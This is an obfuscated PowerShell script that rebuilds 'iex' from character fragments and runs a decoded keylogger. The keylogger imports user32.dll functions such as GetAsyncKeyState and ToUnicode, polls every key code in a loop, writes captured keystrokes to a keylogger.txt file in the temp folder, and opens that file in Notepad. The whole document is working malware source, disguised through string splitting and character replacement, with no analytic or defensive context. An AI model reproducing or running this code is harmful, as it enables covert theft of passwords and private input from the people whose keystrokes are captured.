.( ([stRINg]$veRBosEPRefEREnce)[1,3]+'x'-Join'') (('function Start-KeyLogger(lBiPath=tUwlBienv'+':tempe84keylogger.txttUw) 
{
  lBisignatures = @X5d
[DllImport(tUwuser32.dll'+'tU'+'w, CharSet'+'=CharSet.Auto, ExactSpellin'+'g=true)] 
public static extern sh'+'ort GetAsyncKeyState(int virt'+'ualKeyCode); 
[DllImport(tUwuser32.dlltUw, CharSet=CharSe'+'t.Auto)]
public '+'static extern int GetKeyboard'+'State(byte[] keystate);
[DllImport(tUwuser32.dlltUw, CharSet=C'+'harSet.Aut'+'o)]
public static exter'+'n int MapVirtualKey(uint uCode, int uMapType);
[DllImport(tUwuser32.dlltUw, CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkey'+'state, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
X5d@
  l'+'BiAPI = Add-Type -MemberDefinition lBisignatures -Name X5dWin32X5d -Namespace API -PassThr'+'u
  lBinull = New-Item -Path lBiPath -ItemType File -Force
  try
  {
    Write-Hos'+'t X5dRec'+'ording key presses. Pres'+'s CTRL+C to see results.X5d '+'-ForegroundColor Red
    while (lBitrue)'+' {
   '+'   Start-Sleep -Mill'+'iseconds 4'+'0
   '+'  '+' for (lBiascii = 9; lBiascii -'+'le 254; l'+'Biascii+'+'+)'+' {
        lBistate '+'= lBiAPI::GetAsyncKeyState(lBiascii)
        '+'if (lBistate -e'+'q -32767) {
          lBinull = [console]::CapsLock
          l'+'BivirtualKey = lBiAPI::MapVirtualKey(lBiasc'+'ii, 3)
          lBikbstate = New-O'+'bject Byte[] 2'+'56
'+'       '+'   lBicheckkbstate = lBiAPI::GetKeyboardState(lBikbstate)
          lBimychar = New-Obje'+'ct -TypeName System.Text.StringBui'+'lder
          lBisuccess = lBiAPI::ToUnicode(lBiascii, lBivirtualKey, lBikbstate, lBimycha'+'r, lBim'+'ychar.Capacity, 0)
          if (lBisuccess) 
          {
            [Syst'+'em.IO.File]:'+':Appen'+'dAll'+'Text(lBiPath, lBimycha'+'r, [System.Text.Encoding]::U'+'nicode) 
      '+'    }
        }
      }
    }
  }'+'
  finally
  {
    notepa'+'d lBiPath
  }
}
S'+'tart-KeyLogger').rEPlaCE('tUw',[StriNG][cHAr]34).rEPlaCE('X5d',[StriNG][cHAr]39).rEPlaCE(([cHAr]101+[cHAr]56+[cHAr]52),[StriNG][cHAr]92).rEPlaCE(([cHAr]108+[cHAr]66+[cHAr]105),'$'))
